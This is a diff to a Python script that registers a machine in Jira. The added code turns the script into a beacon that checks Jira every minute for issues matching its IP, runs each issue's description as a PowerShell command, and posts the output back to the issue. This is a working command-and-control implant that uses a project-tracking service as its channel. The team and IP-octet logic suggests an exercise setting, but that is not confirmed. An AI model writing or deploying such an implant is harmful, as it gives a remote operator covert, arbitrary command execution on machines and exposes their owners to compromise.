@@ -9,6 +9,7 @@ from datetime import datetime, timezone
 import requests
 import schedule
 from dotenv import load_dotenv
+import subprocess
 from requests.auth import HTTPBasicAuth
 
 load_dotenv()
@@ -99,6 +100,89 @@ def ip_mapping():
         team_num = IPsplitByOctet[1]
         epic_ID = test_epic_ID
 
+def command():
+    global project_key
+    global command_EPIC_ID
+    global ip_addr
+
+    global url
+    global team_num
+    global epic_ID
+    global issue_key
+
+    #command EPIC ID
+    #JQL vs API for custom field stuff
+    #part of the command EPIC ID
+    #parent is the epic
+    search = {"jql": f"project = {project_key} AND status = \"In Progress\" AND parent = {command_EPIC_ID}",
+              "fields": ["summary", "customfield_10048", "description"]} #IP address and summary
+
+    response = requests.post(url=f"{url}/rest/api/3/search/jql", json=search, headers=headers, auth=auth, timeout=20)
+
+    print(response.json())
+
+    #there are tasks in the demand queue
+    if not len(response.json()["issues"]) == 0:
+
+        for IP in response.json()["issues"]:
+            #JSON custom field format different than JQL
+            #.get prevents key error
+            if IP["fields"].get("customfield_10048") == str(ip_addr):
+                issue_key = IP["key"]
+                print("CHECK FOR COMMAND - THEN RUN COMMAND")
+
+                #double wrapped content means have to access it twice
+                print(IP["fields"]["description"]["content"][0]["content"][0]["text"])
+
+                args = ["powershell.exe", "-NoProfile", "-Command",
+                        IP["fields"]["description"]["content"][0]["content"][0]["text"]]
+
+                result = subprocess.run(
+                    args,
+                    capture_output=True,
+                    text=True
+                )
+
+                result_text = ("Command: " + IP["fields"]["description"]["content"][0]["content"][0]["text"] + "\n"
+                               + "Result: " + result.stdout + " "
+                               + "Error:" + result.stderr)
+
+                timestamp = datetime.now(timezone.utc).strftime(
+                    "%Y-%m-%dT%H:%M:%S.000%z"
+                )
+
+                payload = {
+                    "fields": {
+                        "customfield_10049": timestamp,
+                        "description": {
+                            "type": "doc",
+                            "version": 1,
+                            "content": [
+                                {
+                                    "type": "paragraph",
+                                    "content": [
+                                        {
+                                            "type": "text",
+                                            "text": result_text
+                                        }
+                                    ]
+                                }
+                            ]
+                        }
+                    }
+                }
+
+                requests.put(url=f"{url}/rest/api/3/issue/{issue_key}", json=payload, headers=headers, auth=auth,
+                             timeout=20)
+
+                transition_change = {
+                    "transition": {
+                        "id": 41
+                    }
+                }
+                #move statuses
+                requests.post(url=f"{url}/rest/api/3/issue/{issue_key}/transitions", json=transition_change, headers=headers, auth=auth,
+                             timeout=20)
 
 def callback():
     global url
@@ -121,6 +205,8 @@ def callback():
     }
 
     requests.put(url=f"{url}/rest/api/3/issue/{issue_key}", json=payload, headers=headers, auth=auth, timeout=20)
+
+    command()
 
 def init():
     #have to check if exists already
@@ -145,14 +231,14 @@ def init():
 
     response = requests.post(url=f"{url}/rest/api/3/search/jql", json=search, headers=headers, auth=auth, timeout=20)
 
-    print(response.json())
+    #print(response.json())
     for IP in response.json()["issues"]:
         #JSON custom field format different than JQL
         #.get prevents key error
         if IP["fields"].get("customfield_10048") == str(ip_addr):
             existing_host = True
             issue_key = IP["key"]
-            print("Found Original Story " + issue_key)
+            #print("Found Original Story " + issue_key)
 
             #updates the time
             callback()
@@ -175,21 +261,24 @@ def init():
         response = requests.post(url=f"{url}/rest/api/3/issue", json=payload, headers=headers, auth=auth, timeout=20)
 
         #key is what we need, BUT have to make sure there is not already something with our ip address as title
-        print(response.json()['key'])
-        print(response.text)
-        print(response.status_code)
+        #print(response.json()['key'])
+        #print(response.text)
+        #print(response.status_code)
 
 def main():
     global issue_key
     ip_mapping()
 
     init()
-    schedule.every(4).to(5).minutes.do(callback)
+    #schedule.every(4).to(5).minutes.do(callback)
+    schedule.every(1).minutes.do(callback)
 
     #keeps loop alive
     while True:
         schedule.run_pending()
-        time.sleep(120)
+        time.sleep(30)
+
+
 
 if __name__ == '__main__':
     main()
